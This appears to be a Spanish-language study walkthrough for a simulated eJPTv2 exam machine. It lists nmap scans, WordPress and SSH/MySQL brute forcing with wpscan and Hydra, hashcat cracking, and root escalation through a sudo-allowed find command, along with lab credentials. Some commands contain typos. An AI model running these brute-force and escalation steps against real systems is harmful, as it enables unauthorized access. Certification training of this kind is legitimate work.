# Simulación de examen eJPTv2

Tags: #Nmap #Apache #WordPress #Linux #Dirbuster #Hydra #SearchSploit #SSH #Sudoers #MySQL #Metasploit #HashCat 

## Maquina 1 

- IP ->  VMware
- Ports -> TCP (22, 80, 3306), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.9p1 Debian 10+deb10u2
    - 80 -> Apache httpd 2.4.38
    - 3306 -> MySQL 5.5.5-10.3.38-MariaDB-0+deb10u1

## Recon

Con estos dos comandos podemos escanear la red en donde nos encontremos. 
```bash
❯ arp-scan -I ens33 --localnet --ignoredups       # Para hacer un escaneo de la red local, no puedes encontrar mas usuarios despues del router que no pertenecen a tu red
```

```bash 
❯ nmap -sn ❮Target_IP/24❯                         # Usara ARP para escanear la red
``` 

Para ver los puertos y servicios.
```bash 
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn ❮Target IP❯  -oG allPorts       # Escaneo en la Capa 4 del modelo OSI
```

```bash
❯ nmap -sCV -p22,... ❮Target IP❯ -oN targeted
```

### Enumeración del Puerto 80
```bash
❯ whatweb ❮http://IP❯                  # Nos dara una breve descripcion del gestor de contenidos del puerto 80

	# Mirar la jQuery
	# Servidor Web
```

Abrimos la pagina web en el navegador, encontramos un Apache como pagina por el puerto 80.

Ahora vamos a enumerar la web, para encontrar mas directorios.
```python
❯ dirb http://<IP>/             # Para encontrar rutas en la pagina web  

# Encontramos varias rutas como 
	# /admin, /Downloads, /wordpress, /server-status, /admin/doc
```

Como encontramos un WordPress, enumeraremos los usuarios con su herramienta. 
```bash
❯ wpscan --url http://URL/wordpress/ -e u                                             # Enumeracion WordPress

	# u = Enumerar usuarios

# Encontramos algunos usuarios como 
	# admin, hugo, philip
```

```bash
❯ wpscan --url http://URL/wordpress/ --passwords /usr/share/wordlists/rockyou.txt      # BruteForce

	# passwords = Enumerar passwords

# Encontramos algunas passwds  
	# admin:password, hugo:9876543210, philip:password

# Tambien nos muestra que el WordPress tiene una version 4.8.22, buscando la version actual que es 6.1
```

* También podríamos enumerar los plugin. 
```bash 
/wordpress/wp-admin/plugins.php
```

En dado caso de que no tengamos esas herramientas, podemos usar Hydra, para encontrar usuarios y sus passwd
Esto se usa en el panel del admin de WP.
```python
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:S=302' 
❯ hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt http://IP http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid user'
# Haremos un ataque de fuerza bruta a WordPress

	# l (ele) = Usuario que en este caso es  'admin'
	# P = Ruta del diccionario
	# log y pwd = Lo podemos encontrar en el apartado de la pagina web 'Ctrl + u' 
	# S = Redireccionamiento con el codigo 302
	# F = Error que nos muestre el panel de autenticacion, por si no sirve con el 'S'
```

Y así logramos entrar al login de la web. 


### Enumeración del Puerto 22

```bash
❯ searchsploit openssh 7.9p1                 # Para buscar un exploit con esa version de OpenSSH, pero como no encontramos usaremos Hydra
```

```python
❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ssh://❮IP❯/ 
# Haremos un ataque de fuerza bruta al puerto SSH

	# ssh = Puerto al que vamos a atacar 22
	# IP = Direccion de la maquina victima
	# P = Ruta del diccionario o 'archivo que contiene passwds'
	# L = Ruta del diccionario o 'archivo que contiene users'

# Encontramos dos usuarios y dos passwd
	# vagrant:vagrant, debian:debian
```

### Enumeración del Puerto 3306

```bash 
❯ mysql -u root -p -h <IP>

	# h = Host
	# u = User
	# p= passwd    -> Passwd por defecto   -> Solo enter, root, admin

# Una vez dentro podemos hacer lo siguiente
	> show databases;                                # Muestra todas las bases de datos existentes
	> use ❮DB_name❯;                                 # Usamos una base de datos especifica
	> show tables;                                   # Miramos las tablas de la base de datos
	> select * from wp-users;                        # Seleccionamos todo de la tabla de 'wp_users'
# Encontramos los usuarios y las passwd con hash
```
Como no conseguimos el acceso podríamos usar Metasploit o Hydra

```python 
❯ hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt mysql://<IP>

# Si nos sale el error 'blocked' es prque no podremos hacer ataques de fuerza bruta
```

Por lo que para romper los hashes de las passwd, lo haremos con Hashcat. **Pero ante debemos de colocar el hash dentro de un archivo llamado hash.txt.**  
```bash 
❯ hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt 

	# m = 400 = $P%
	# hash.txt = Archivo que contiene el hash
	# Ruta del diccionario 
```


## User

```bash
❯  ssh ❮User❯@❮IP❯                                  # Para conectarnos por ssh en el puerto default 22 con los usuarios obtenidos 
```

## Root

```
❯ contrab -l       # Listas las tareas CRON 
```

```bash 
❯ find / -perm -4000 2>/dev/null                  # Para ver que comandos son SUID, los buscamos desde la raiz 
❯ find / -perm -4000 -ls 2>/dev/null              # Para ver que comandos son SUID, los buscamos desde la raiz y ademas miramos el privilegio
```

```bash
❯ sudo -l                                          # Ver que permisos tenemos en el sudoers (l=ele)

	# (ALL : ALL) ALL
	# (root) NOPASSWD: /usr/bin/find -> Puede ejecutar un comando sin necesidad de password
```

Buscamos en la siguiente pagina:
- **GTFOBins**: [https://gtfobins.github.io](https://gtfobins.github.io/)
* [Find-exploit](https://andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/)

```bash 
❯ sudo find /etc/passwd-exec /bin/bash \;
```

### Siendo Root

```bash 
❯ cat /etc/passwd        # Podemos enumerar la cantidad de usuarios, terminan en /bin/bash
❯ cd /home               # Ahi nos salen los dir de cada usuario con 'ls'

❯ cd /var/www/html/wordpress                # Podemos mirar el archivo de configuracion de Wordpress... 
	# wp-config.php               -> Archivo con todas las configuraciones generales
	# wp-settings.php             -> Archivo de configuracion, encargado de los plugins
❯ cd /var/www/html/wordpress/wp-admin       # Directorio que contiene mas informacion como formulario
❯ cd /var/www/html/wordpress/wp-content     # Directorio que contiene los directorios de plugins y los temas.
```

## Metasploit Mysql

```bash 
❯ msfconsole -q                   # q = Quitar el banner de inicio

❯ search mysql_login              # Buscamos el exploit
	❯ use 0 
	❯ show options 
	❯ set RHOSTS 192.168.68.1    # Colocamos la IP de la maquina de atacante
	❯ set PASS_FILE /usr/chare/metasploit-framework/data/wordlists/unix_passwords.txt   # Agregamos la ruta del diccionario de passwd que tengamos en nuestra maquina
	❯ run 

# Si nos sale error, quiere decir que hay una regla que nos bloquea el ataque por fuerza bruta 
```

### Pivoting

Para saber si se puede hacer Pivoting es colocar le siguiente comando dentro de la maquina victima.
```bash 
❯ ifconfig         # Para ver la direccion IP de la maquina  
❯ ip a             # Miramos los adaptadores de red y con eso miraremos si hay mas de uno para poder hacer el Pivoting
```